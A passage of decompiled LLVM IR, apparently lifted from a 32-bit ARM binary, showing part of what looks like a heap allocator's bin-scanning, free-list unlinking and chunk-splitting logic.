  %v3_b438 = load i32, i32* %v2_b438, align 4
  store i32 %v3_b438, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b43c

dec_label_pc_b43c:                                ; preds = %.thread, %dec_label_pc_b3e4, %dec_label_pc_b3c8, %dec_label_pc_b438
  %v0_b45c = phi i32 [ %v1_b3f8, %dec_label_pc_b3e4 ], [ %v1_b3d8, %dec_label_pc_b3c8 ], [ %v3_b438, %dec_label_pc_b438 ], [ %v3_b408, %.thread ]
  %v0_b450 = phi i32 [ %v1_b3e8, %dec_label_pc_b3e4 ], [ %v3_b3d0, %dec_label_pc_b3c8 ], [ %v1_b3e8, %dec_label_pc_b438 ], [ %v1_b3e8, %.thread ]
  %v1_b440 = phi i32 [ %v1_b3f0, %dec_label_pc_b3e4 ], [ %v1_b3cc, %dec_label_pc_b3c8 ], [ %v1_b3f0, %dec_label_pc_b438 ], [ %v1_b3f0, %.thread ]
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v2_b440 = add i32 %v1_b440, ptrtoint (i32* @global_var_1f010.69 to i32)
  %v3_b440 = inttoptr i32 %v2_b440 to i32*
  %v4_b440 = load i32, i32* %v3_b440, align 4
  %v3_b444 = sdiv i32 %v0_b450, 32
  store i32 %v3_b444, i32* %r3.global-to-local, align 4
  %v4_b448 = mul nsw i32 %v3_b444, 4
  %v5_b448 = add i32 %v4_b440, %v4_b448
  store i32 %v5_b448, i32* %r1.global-to-local, align 4
  %v1_b44c = add i32 %v5_b448, 820
  %v2_b44c = inttoptr i32 %v1_b44c to i32*
  %v3_b44c = load i32, i32* %v2_b44c, align 4
  %v1_b450 = urem i32 %v0_b450, 32
  store i32 %v1_b450, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_b458 = shl i32 1, %v1_b450
  %v8_b458 = or i32 %v3_b44c, %v7_b458
  store i32 %v8_b458, i32* %r3.global-to-local, align 4
  %v1_b45c = load i32, i32* @r6, align 4
  %v2_b45c = add i32 %v1_b45c, 12
  %v3_b45c = inttoptr i32 %v2_b45c to i32*
  store i32 %v0_b45c, i32* %v3_b45c, align 4
  %v0_b460 = load i32, i32* @lr, align 4
  %v1_b460 = load i32, i32* @r6, align 4
  %v2_b460 = add i32 %v1_b460, 8
  %v3_b460 = inttoptr i32 %v2_b460 to i32*
  store i32 %v0_b460, i32* %v3_b460, align 4
  %v0_b464 = load i32, i32* %r3.global-to-local, align 4
  %v1_b464 = load i32, i32* %r1.global-to-local, align 4
  %v2_b464 = add i32 %v1_b464, 820
  %v3_b464 = inttoptr i32 %v2_b464 to i32*
  store i32 %v0_b464, i32* %v3_b464, align 4
  %v0_b468 = load i32, i32* @r6, align 4
  %v1_b468 = load i32, i32* @lr, align 4
  %v2_b468 = add i32 %v1_b468, 12
  %v3_b468 = inttoptr i32 %v2_b468 to i32*
  store i32 %v0_b468, i32* %v3_b468, align 4
  %v0_b46c = load i32, i32* @r6, align 4
  %v1_b46c = load i32, i32* %ip.global-to-local, align 4
  %v2_b46c = add i32 %v1_b46c, 8
  %v3_b46c = inttoptr i32 %v2_b46c to i32*
  store i32 %v0_b46c, i32* %v3_b46c, align 4
  %v0_b488.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b488

dec_label_pc_b474:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b2cc, %dec_label_pc_b328
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_b47c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b47c, i32* @sb, align 4
  %v0_b480 = load i32, i32* @sl, align 4
  %v1_b480 = add i32 %v0_b480, 16
  store i32 %v1_b480, i32* @fp, align 4
  %v1_b484 = add i32 %v4_b47c, 52
  store i32 %v1_b484, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b43c, %dec_label_pc_b474
  %v0_b3a8 = phi i32 [ %v0_b488.pre, %dec_label_pc_b43c ], [ %v1_b484, %dec_label_pc_b474 ]
  %v1_b488 = add i32 %v0_b3a8, 12
  %v2_b488 = inttoptr i32 %v1_b488 to i32*
  %v3_b488 = load i32, i32* %v2_b488, align 4
  store i32 %v3_b488, i32* @r6, align 4
  %v9_b48c = icmp eq i32 %v3_b488, %v0_b3a8
  br i1 %v9_b48c, label %dec_label_pc_b494, label %dec_label_pc_b33c

dec_label_pc_b494:                                ; preds = %dec_label_pc_b488
  %v0_b494 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_b494, 256
  %v0_b54c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_b494.dec_label_pc_b54c_crit_edge, label %dec_label_pc_b49c

dec_label_pc_b494.dec_label_pc_b54c_crit_edge:    ; preds = %dec_label_pc_b494
  %.pre200 = mul i32 %v0_b54c.pre, 8
  br label %dec_label_pc_b54c

dec_label_pc_b49c:                                ; preds = %dec_label_pc_b494
  %v4_b49c = mul i32 %v0_b54c.pre, 8
  %v5_b49c = add i32 %v4_b49c, %v0_b3a8
  store i32 %v5_b49c, i32* %r3.global-to-local, align 4
  %v1_b4a0 = add i32 %v5_b49c, -8
  store i32 %v1_b4a0, i32* %r1.global-to-local, align 4
  %v1_b4a4 = add i32 %v5_b49c, 4
  %v2_b4a4 = inttoptr i32 %v1_b4a4 to i32*
  %storemerge.pre = load i32, i32* %v2_b4a4, align 4
  br label %dec_label_pc_b544

dec_label_pc_b4ac:                                ; preds = %dec_label_pc_b544
  %v1_b4ac = add i32 %v1_b4d4, 4
  %v2_b4ac = inttoptr i32 %v1_b4ac to i32*
  %v3_b4ac = load i32, i32* %v2_b4ac, align 4
  store i32 %v3_b4ac, i32* %r3.global-to-local, align 4
  %v1_b4b0 = and i32 %v3_b4ac, -4
  store i32 %v1_b4b0, i32* %r2.global-to-local, align 4
  %v3_b4b4 = icmp ult i32 %v1_b4b0, %v0_b494
  %v1_b4b8 = add i32 %v1_b4d4, 12
  %v2_b4b8 = inttoptr i32 %v1_b4b8 to i32*
  %v3_b4b8 = load i32, i32* %v2_b4b8, align 4
  store i32 %v3_b4b8, i32* %r0.global-to-local, align 4
  br i1 %v3_b4b4, label %dec_label_pc_b544, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b4ac
  %v1_b4c0 = add i32 %v1_b4d4, 8
  %v2_b4c0 = inttoptr i32 %v1_b4c0 to i32*
  %v3_b4c0 = load i32, i32* %v2_b4c0, align 4
  store i32 %v3_b4c0, i32* %r1.global-to-local, align 4
  %v1_b4c4 = add i32 %v3_b4c0, 12
  %v2_b4c4 = inttoptr i32 %v1_b4c4 to i32*
  %v3_b4c4 = load i32, i32* %v2_b4c4, align 4
  store i32 %v3_b4c4, i32* %r3.global-to-local, align 4
  %v9_b4c8 = icmp eq i32 %v3_b4c4, %v1_b4d4
  br i1 %v9_b4c8, label %dec_label_pc_b4d0, label %dec_label_pc_b4dc

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b4c0
  %v1_b4d0 = add i32 %v3_b4b8, 8
  %v2_b4d0 = inttoptr i32 %v1_b4d0 to i32*
  %v3_b4d0 = load i32, i32* %v2_b4d0, align 4
  store i32 %v3_b4d0, i32* %r3.global-to-local, align 4
  %v9_b4d4 = icmp eq i32 %v3_b4d0, %v1_b4d4
  br i1 %v9_b4d4, label %dec_label_pc_b4e0, label %dec_label_pc_b4dc

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b4c0, %dec_label_pc_b4d0
  %v0_b4dc = call i32 @abort()
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v0_b4e0.pre = load i32, i32* @sl, align 4
  %v1_b4e0.pre = load i32, i32* @r2, align 4
  %v0_b4e8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_b4e0

dec_label_pc_b4e0:                                ; preds = %dec_label_pc_b4d0, %dec_label_pc_b4dc
  %v1_b4e8 = phi i32 [ %v3_b4b8, %dec_label_pc_b4d0 ], [ %v0_b4dc, %dec_label_pc_b4dc ]
  %v0_b4e8 = phi i32 [ %v3_b4c0, %dec_label_pc_b4d0 ], [ %v0_b4e8.pre, %dec_label_pc_b4dc ]
  %v1_b4e0 = phi i32 [ %v1_b4b0, %dec_label_pc_b4d0 ], [ %v1_b4e0.pre, %dec_label_pc_b4dc ]
  %v0_b4e0 = phi i32 [ %v0_b494, %dec_label_pc_b4d0 ], [ %v0_b4e0.pre, %dec_label_pc_b4dc ]
  %v2_b4e0 = sub i32 %v1_b4e0, %v0_b4e0
  store i32 %v2_b4e0, i32* %lr.global-to-local, align 4
  %v2_b4e8 = add i32 %v1_b4e8, 8
  %v3_b4e8 = inttoptr i32 %v2_b4e8 to i32*
  store i32 %v0_b4e8, i32* %v3_b4e8, align 4
  %v0_b4ec = load i32, i32* %r0.global-to-local, align 4
  %v1_b4ec = load i32, i32* %r1.global-to-local, align 4
  %v2_b4ec = add i32 %v1_b4ec, 12
  %v3_b4ec = inttoptr i32 %v2_b4ec to i32*
  store i32 %v0_b4ec, i32* %v3_b4ec, align 4
  %v0_b4f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b4f0 = add i32 %v0_b4f0, 8
  store i32 %v1_b4f0, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_b4e0, 15
  br i1 %tmp207, label %dec_label_pc_b510, label %dec_label_pc_b4f8

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4e0
  %v1_b4f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_b4f8 = add i32 %v1_b4f8, %v0_b4f0
  store i32 %v2_b4f8, i32* %r2.global-to-local, align 4
  %v1_b4fc = add i32 %v2_b4f8, 4
  %v2_b4fc = inttoptr i32 %v1_b4fc to i32*
  %v3_b4fc = load i32, i32* %v2_b4fc, align 4
  store i32 %v3_b4fc, i32* %r3.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b504

dec_label_pc_b504.loopexit:                       ; preds = %dec_label_pc_b3a4
  %v1_b3b0 = load i32, i32* @r6, align 4
  %v2_b3b0 = load i32, i32* @sl, align 4
  %v3_b3b0 = add i32 %v2_b3b0, %v1_b3b0
  store i32 %v3_b3b0, i32* %r2.global-to-local, align 4
  %v2_b3b4 = add i32 %v3_b3b0, 4
  %v3_b3b4 = inttoptr i32 %v2_b3b4 to i32*
  %v4_b3b4 = load i32, i32* %v3_b3b4, align 4
  store i32 %v4_b3b4, i32* %r3.global-to-local, align 4
  %v2_b3b8 = add i32 %v1_b3b0, 8
  store i32 %v2_b3b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b504

dec_label_pc_b504:                                ; preds = %.dec_label_pc_b504_crit_edge, %dec_label_pc_b504.loopexit, %dec_label_pc_b4f8
  %v1_b508 = phi i32 [ %v4_b62c, %.dec_label_pc_b504_crit_edge ], [ %v3_b3b0, %dec_label_pc_b504.loopexit ], [ %v2_b4f8, %dec_label_pc_b4f8 ]
  %v0_b504 = phi i32 [ %v7_b62c, %.dec_label_pc_b504_crit_edge ], [ %v4_b3b4, %dec_label_pc_b504.loopexit ], [ %v3_b4fc, %dec_label_pc_b4f8 ]
  %v1_b504 = or i32 %v0_b504, 1
  store i32 %v1_b504, i32* %r3.global-to-local, align 4
  %v2_b508 = add i32 %v1_b508, 4
  %v3_b508 = inttoptr i32 %v2_b508 to i32*
  store i32 %v1_b504, i32* %v3_b508, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b510:                                ; preds = %dec_label_pc_b4e0
  %v1_b510 = load i32, i32* @sl, align 4
  %v2_b510 = add i32 %v1_b510, %v0_b4f0
  store i32 %v2_b510, i32* %r2.global-to-local, align 4
  %v1_b514 = or i32 %v1_b510, 1
  store i32 %v1_b514, i32* %r3.global-to-local, align 4
  %v0_b518 = load i32, i32* %lr.global-to-local, align 4
  %v1_b518 = or i32 %v0_b518, 1
  store i32 %v1_b518, i32* %r1.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r4.global-to-local, align 4
  %v2_b520 = add i32 %v0_b4f0, 4
  %v3_b520 = inttoptr i32 %v2_b520 to i32*
  store i32 %v1_b514, i32* %v3_b520, align 4
  %v0_b524 = load i32, i32* %r2.global-to-local, align 4
  %v1_b524 = load i32, i32* @r6, align 4
  %v2_b524 = add i32 %v1_b524, 8
  %v3_b524 = inttoptr i32 %v2_b524 to i32*
  store i32 %v0_b524, i32* %v3_b524, align 4
  %v0_b528 = load i32, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r6, align 4
  %v2_b528 = add i32 %v1_b528, 12
  %v3_b528 = inttoptr i32 %v2_b528 to i32*
  store i32 %v0_b528, i32* %v3_b528, align 4
  %v0_b52c = load i32, i32* %lr.global-to-local, align 4
  %v1_b52c = load i32, i32* %r2.global-to-local, align 4
  %v3_b52c = add i32 %v1_b52c, %v0_b52c
  %v4_b52c = inttoptr i32 %v3_b52c to i32*
  store i32 %v0_b52c, i32* %v4_b52c, align 4
  %v0_b530 = load i32, i32* %r1.global-to-local, align 4
  %v1_b530 = load i32, i32* %r2.global-to-local, align 4
  %v2_b530 = add i32 %v1_b530, 4
  %v3_b530 = inttoptr i32 %v2_b530 to i32*
  store i32 %v0_b530, i32* %v3_b530, align 4
  %v0_b534 = load i32, i32* @r6, align 4
  %v1_b534 = load i32, i32* %r2.global-to-local, align 4
  %v2_b534 = add i32 %v1_b534, 12
  %v3_b534 = inttoptr i32 %v2_b534 to i32*
  store i32 %v0_b534, i32* %v3_b534, align 4
  %v0_b538 = load i32, i32* @r6, align 4
  %v1_b538 = load i32, i32* %r2.global-to-local, align 4
  %v2_b538 = add i32 %v1_b538, 8
  %v3_b538 = inttoptr i32 %v2_b538 to i32*
  store i32 %v0_b538, i32* %v3_b538, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b544:                                ; preds = %dec_label_pc_b4ac, %dec_label_pc_b49c
  %v1_b4d4 = phi i32 [ %storemerge.pre, %dec_label_pc_b49c ], [ %v3_b4b8, %dec_label_pc_b4ac ]
  store i32 %v1_b4d4, i32* %ip.global-to-local, align 4
  %v9_b544 = icmp eq i32 %v1_b4d4, %v1_b4a0
  br i1 %v9_b544, label %dec_label_pc_b54c.loopexit, label %dec_label_pc_b4ac

dec_label_pc_b54c.loopexit:                       ; preds = %dec_label_pc_b544
  br label %dec_label_pc_b54c

dec_label_pc_b54c:                                ; preds = %dec_label_pc_b494.dec_label_pc_b54c_crit_edge, %dec_label_pc_b54c.loopexit
  %v4_b57c.pre-phi = phi i32 [ %.pre200, %dec_label_pc_b494.dec_label_pc_b54c_crit_edge ], [ %v4_b49c, %dec_label_pc_b54c.loopexit ]
  %v1_b54c = add i32 %v0_b54c.pre, 1
  store i32 %v1_b54c, i32* %r2.global-to-local, align 4
  %v1_b550 = urem i32 %v1_b54c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r0.global-to-local, align 4
  %v6_b55c = shl i32 1, %v1_b550
  store i32 %v6_b55c, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_b564 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b564, i32* %r3.global-to-local, align 4
  %v3_b568 = udiv i32 %v1_b54c, 32
  store i32 %v3_b568, i32* @r5, align 4
  %v4_b56c = mul nuw nsw i32 %v3_b568, 4
  %v5_b56c = add i32 %v4_b564, %v4_b56c
  store i32 %v5_b56c, i32* %r2.global-to-local, align 4
  %v1_b570 = add i32 %v5_b56c, 820
  %v2_b570 = inttoptr i32 %v1_b570 to i32*
  %v3_b570 = load i32, i32* %v2_b570, align 4
  store i32 %v3_b570, i32* @r4, align 4
  %v1_b574 = add i32 %v4_b564, 52
  store i32 %v1_b574, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_b57c = add i32 %v1_b574, %v4_b57c.pre-phi
  store i32 %v5_b57c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b580

dec_label_pc_b580:                                ; preds = %dec_label_pc_b5e8, %dec_label_pc_b54c
  %v1_b588 = phi i32 [ %v1_b588.pre, %dec_label_pc_b5e8 ], [ %v3_b570, %dec_label_pc_b54c ]
  %v0_b588 = phi i32 [ %v0_b580.pre, %dec_label_pc_b5e8 ], [ %v6_b55c, %dec_label_pc_b54c ]
  %v1_b580 = sub i32 1, %v0_b588
  %v2_b580 = icmp ult i32 %v0_b588, 2
  %v1_b580. = select i1 %v2_b580, i32 %v1_b580, i32 0
  store i32 %v1_b580., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_b588, %v1_b588
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_b580
  %v5_b58c = or i32 %v1_b580., 1
  store i32 %v5_b58c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b598.preheader

bb142:                                            ; preds = %dec_label_pc_b580
  %v2_b590 = icmp eq i32 %v1_b580., 0
  br i1 %v2_b590, label %.dec_label_pc_b5d4.preheader_crit_edge, label %dec_label_pc_b598.preheader

.dec_label_pc_b5d4.preheader_crit_edge:           ; preds = %bb142
  %v0_b5cc54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5d4.preheader

dec_label_pc_b598.preheader:                      ; preds = %bb142, %.thread12
  %v0_b598.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %dec_label_pc_b598.preheader, %dec_label_pc_b5a4
  %v0_b598 = phi i32 [ %v0_b598.pre, %dec_label_pc_b598.preheader ], [ %v1_b598, %dec_label_pc_b5a4 ]
  %v1_b598 = add i32 %v0_b598, 1
  store i32 %v1_b598, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_b598, 2
  br i1 %tmp208, label %dec_label_pc_b678.loopexit, label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %dec_label_pc_b598
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r3.global-to-local, align 4
  %v1_b5a8 = load i32, i32* @r8, align 4
  %v2_b5a8 = add i32 %v1_b5a8, ptrtoint (i32* @global_var_1f010.69 to i32)
  %v3_b5a8 = inttoptr i32 %v2_b5a8 to i32*
  %v4_b5a8 = load i32, i32* %v3_b5a8, align 4
  store i32 %v4_b5a8, i32* %r2.global-to-local, align 4
  %v4_b5ac = mul i32 %v1_b598, 4
  %v5_b5ac = add i32 %v4_b5a8, %v4_b5ac
  store i32 %v5_b5ac, i32* %r3.global-to-local, align 4
  %v1_b5b0 = add i32 %v5_b5ac, 820
  %v2_b5b0 = inttoptr i32 %v1_b5b0 to i32*
  %v3_b5b0 = load i32, i32* %v2_b5b0, align 4
  store i32 %v3_b5b0, i32* @r4, align 4
  %v2_b5b4 = icmp eq i32 %v3_b5b0, 0
  br i1 %v2_b5b4, label %dec_label_pc_b598, label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b5a4
  %v4_b5bc = mul i32 %v1_b598, 256
  %v5_b5bc = add i32 %v4_b5a8, %v4_b5bc
  store i32 %v5_b5bc, i32* %r3.global-to-local, align 4
  %v1_b5c0 = add i32 %v5_b5bc, 44
  store i32 %v1_b5c0, i32* %r0.global-to-local, align 4
  %v0_b5c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_b5c4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5d4.preheader

dec_label_pc_b5d4.preheader:                      ; preds = %.dec_label_pc_b5d4.preheader_crit_edge, %dec_label_pc_b5bc
  %v0_b5cc54 = phi i32 [ %v1_b5c0, %dec_label_pc_b5bc ], [ %v0_b5cc54.pre, %.dec_label_pc_b5d4.preheader_crit_edge ]
  %v0_b5f0 = phi i32 [ %v3_b5b0, %dec_label_pc_b5bc ], [ %v1_b588, %.dec_label_pc_b5d4.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_b5c4, %dec_label_pc_b5bc ], [ %v0_b588, %.dec_label_pc_b5d4.preheader_crit_edge ]
  %v2_b5d451 = and i32 %ip.promoted, %v0_b5f0
  %v4_b5d453 = icmp eq i32 %v2_b5d451, 0
  br i1 %v4_b5d453, label %dec_label_pc_b5cc, label %dec_label_pc_b5dc

dec_label_pc_b5cc:                                ; preds = %dec_label_pc_b5d4.preheader, %dec_label_pc_b5cc
  %v2_b5d056 = phi i32 [ %v2_b5d0, %dec_label_pc_b5cc ], [ %ip.promoted, %dec_label_pc_b5d4.preheader ]
  %v0_b5cc55 = phi i32 [ %v1_b5cc, %dec_label_pc_b5cc ], [ %v0_b5cc54, %dec_label_pc_b5d4.preheader ]
  %v1_b5cc = add i32 %v0_b5cc55, 8
  %v2_b5d0 = mul i32 %v2_b5d056, 2
  %v2_b5d4 = and i32 %v2_b5d0, %v0_b5f0
  %v4_b5d4 = icmp eq i32 %v2_b5d4, 0
  br i1 %v4_b5d4, label %dec_label_pc_b5cc, label %dec_label_pc_b5d4.dec_label_pc_b5dc_crit_edge

dec_label_pc_b5d4.dec_label_pc_b5dc_crit_edge:    ; preds = %dec_label_pc_b5cc
  store i32 %v1_b5cc, i32* %r0.global-to-local, align 4
  store i32 %v2_b5d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5d4.dec_label_pc_b5dc_crit_edge, %dec_label_pc_b5d4.preheader
  %v0_b5fc = phi i32 [ %v2_b5d0, %dec_label_pc_b5d4.dec_label_pc_b5dc_crit_edge ], [ %ip.promoted, %dec_label_pc_b5d4.preheader ]
  %v0_b620 = phi i32 [ %v1_b5cc, %dec_label_pc_b5d4.dec_label_pc_b5dc_crit_edge ], [ %v0_b5cc54, %dec_label_pc_b5d4.preheader ]
  %v1_b5dc = add i32 %v0_b620, 12
  %v2_b5dc = inttoptr i32 %v1_b5dc to i32*
  %v3_b5dc = load i32, i32* %v2_b5dc, align 4
  store i32 %v3_b5dc, i32* @lr, align 4
  %v9_b5e0 = icmp eq i32 %v3_b5dc, %v0_b620
  br i1 %v9_b5e0, label %dec_label_pc_b5e8, label %dec_label_pc_b608

dec_label_pc_b5e8:                                ; preds = %dec_label_pc_b5dc
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r0.global-to-local, align 4
  %v1_b5ec = load i32, i32* @r8, align 4
  %v2_b5ec = add i32 %v1_b5ec, ptrtoint (i32* @global_var_1f010.69 to i32)
  %v3_b5ec = inttoptr i32 %v2_b5ec to i32*
  %v4_b5ec = load i32, i32* %v3_b5ec, align 4
  %v2_b5f0 = sub i32 -1, %v0_b5fc
  %v3_b5f0 = and i32 %v0_b5f0, %v2_b5f0
  store i32 %v3_b5f0, i32* @r4, align 4
  %v1_b5f4 = load i32, i32* @r5, align 4
  %v4_b5f4 = mul i32 %v1_b5f4, 4
  %v5_b5f4 = add i32 %v4_b5f4, %v4_b5ec
  store i32 %v5_b5f4, i32* %r3.global-to-local, align 4
  %v1_b5f8 = add i32 %v0_b620, 8
  store i32 %v1_b5f8, i32* %r0.global-to-local, align 4
  %v2_b5fc = mul i32 %v0_b5fc, 2
  store i32 %v2_b5fc, i32* %ip.global-to-local, align 4
  %v2_b600 = add i32 %v5_b5f4, 820
  %v3_b600 = inttoptr i32 %v2_b600 to i32*
  store i32 %v3_b5f0, i32* %v3_b600, align 4
  %v0_b580.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_b588.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b580

dec_label_pc_b608:                                ; preds = %dec_label_pc_b5dc
  %v1_b608 = add i32 %v3_b5dc, 4
  %v2_b608 = inttoptr i32 %v1_b608 to i32*
  %v3_b608 = load i32, i32* %v2_b608, align 4
  store i32 %v3_b608, i32* %r3.global-to-local, align 4
  %v1_b60c = and i32 %v3_b608, -4
  store i32 %v1_b60c, i32* %r2.global-to-local, align 4
  %v0_b610 = load i32, i32* @sl, align 4
  %v2_b610 = sub i32 %v1_b60c, %v0_b610
  store i32 %v2_b610, i32* %ip.global-to-local, align 4
  %v1_b614 = add i32 %v3_b5dc, 12
  %v2_b614 = inttoptr i32 %v1_b614 to i32*
  %v3_b614 = load i32, i32* %v2_b614, align 4
  store i32 %v3_b614, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_b610, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_b608
  %v6_b61c = add i32 %v1_b60c, %v3_b5dc
  store i32 %v6_b61c, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_b608, %bb143
  %v2_b620 = add i32 %v3_b614, 8
  %v3_b620 = inttoptr i32 %v2_b620 to i32*
  store i32 %v0_b620, i32* %v3_b620, align 4
  %v0_b624 = load i32, i32* %r3.global-to-local, align 4
  %v1_b624 = load i32, i32* %r0.global-to-local, align 4
  %v2_b624 = add i32 %v1_b624, 12
  %v3_b624 = inttoptr i32 %v2_b624 to i32*
  store i32 %v0_b624, i32* %v3_b624, align 4
  %v4_b628 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_b504_crit_edge, label %dec_label_pc_b634

.dec_label_pc_b504_crit_edge:                     ; preds = %bb144
  %v5_b628 = add i32 %v4_b628, 8
  store i32 %v5_b628, i32* %r4.global-to-local, align 4
  %v4_b62c = load i32, i32* %r2.global-to-local, align 4
  %v5_b62c = add i32 %v4_b62c, 4
  %v6_b62c = inttoptr i32 %v5_b62c to i32*
  %v7_b62c = load i32, i32* %v6_b62c, align 4
  store i32 %v7_b62c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b504

dec_label_pc_b634:                                ; preds = %bb144
  %v1_b634 = load i32, i32* @sl, align 4
  %v2_b634 = add i32 %v1_b634, %v4_b628
  store i32 %v2_b634, i32* %r1.global-to-local, align 4
  %v1_b63c = load i32, i32* @r6, align 4
  %v2_b63c = add i32 %v1_b63c, 8
  %v3_b63c = inttoptr i32 %v2_b63c to i32*
  store i32 %v2_b634, i32* %v3_b63c, align 4
  %v0_b640 = load i32, i32* %r1.global-to-local, align 4
  %v1_b640 = load i32, i32* @r6, align 4
  %v2_b640 = add i32 %v1_b640, 12
  %v3_b640 = inttoptr i32 %v2_b640 to i32*
  store i32 %v0_b640, i32* %v3_b640, align 4
  %v0_b644 = load i32, i32* @r6, align 4
  %v1_b644 = load i32, i32* %r1.global-to-local, align 4
  %v2_b644 = add i32 %v1_b644, 8
  %v3_b644 = inttoptr i32 %v2_b644 to i32*
  store i32 %v0_b644, i32* %v3_b644, align 4
  %v0_b648 = load i32, i32* @r6, align 4
  %v1_b648 = load i32, i32* %r1.global-to-local, align 4
  %v2_b648 = add i32 %v1_b648, 12
  %v3_b648 = inttoptr i32 %v2_b648 to i32*
  store i32 %v0_b648, i32* %v3_b648, align 4
  %tmp210 = icmp ult i32 %v1_b634, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_b634
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  %v8_b654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v8_b654, i32* %r3.global-to-local, align 4
  %v4_b658 = load i32, i32* %r1.global-to-local, align 4
  %v6_b658 = add i32 %v8_b654, 48
  %v7_b658 = inttoptr i32 %v6_b658 to i32*
  store i32 %v4_b658, i32* %v7_b658, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_b634, %bb145
  %v0_b65c = load i32, i32* @sl, align 4
  %v1_b65c = or i32 %v0_b65c, 1
  store i32 %v1_b65c, i32* %r2.global-to-local, align 4
  %v0_b660 = load i32, i32* %ip.global-to-local, align 4
  %v1_b660 = or i32 %v0_b660, 1
  store i32 %v1_b660, i32* %r3.global-to-local, align 4
  %v0_b664 = load i32, i32* @lr, align 4
  %v1_b664 = add i32 %v0_b664, 8
  store i32 %v1_b664, i32* %r4.global-to-local, align 4
  %v2_b668 = add i32 %v0_b664, 4
  %v3_b668 = inttoptr i32 %v2_b668 to i32*
  store i32 %v1_b65c, i32* %v3_b668, align 4
  %v0_b66c = load i32, i32* %ip.global-to-local, align 4
  %v1_b66c = load i32, i32* %r1.global-to-local, align 4
  %v3_b66c = add i32 %v1_b66c, %v0_b66c
  %v4_b66c = inttoptr i32 %v3_b66c to i32*
  store i32 %v0_b66c, i32* %v4_b66c, align 4
  %v0_b670 = load i32, i32* %r3.global-to-local, align 4
  %v1_b670 = load i32, i32* %r1.global-to-local, align 4
  %v2_b670 = add i32 %v1_b670, 4
  %v3_b670 = inttoptr i32 %v2_b670 to i32*
  store i32 %v0_b670, i32* %v3_b670, align 4
  br label %dec_label_pc_bac4

dec_label_pc_b678.loopexit:                       ; preds = %dec_label_pc_b598
  br label %dec_label_pc_b678

dec_label_pc_b678:                                ; preds = %dec_label_pc_b678.loopexit, %dec_label_pc_b28c, %dec_label_pc_b294
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %ip.global-to-local, align 4
  %v4_b680 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_b680, i32* @r0, align 4
